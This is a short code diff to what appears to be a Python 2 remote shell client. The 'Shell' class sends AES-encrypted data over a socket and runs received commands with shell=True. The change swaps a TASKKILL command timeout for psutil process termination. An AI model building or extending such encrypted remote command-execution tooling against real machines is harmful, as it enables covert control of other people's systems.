@@ -1,5 +1,5 @@
 #!/usr/bin/env python2
-import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random
+import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil
 from Crypto.Cipher import AES
 
 def windows_only(func):
@@ -90,10 +90,12 @@ class Shell:
 		data_package = self.encrypt(data_package)
 		self.comm_socket.sendall(data_package)
 		
+	def kill_proc(self, pid):
+		psutil.Process(pid).terminate()
+		
 	def execute_shell_command(self, command):
 		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-		proc_kill = lambda p: subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=p.pid))
-		timer = threading.Timer(60, proc_kill, [proc])
+		timer = threading.Timer(60, self.kill_proc, [proc.pid])
 		timer.start()
 		out = proc.stdout.read() + proc.stderr.read()
 		timer.cancel()
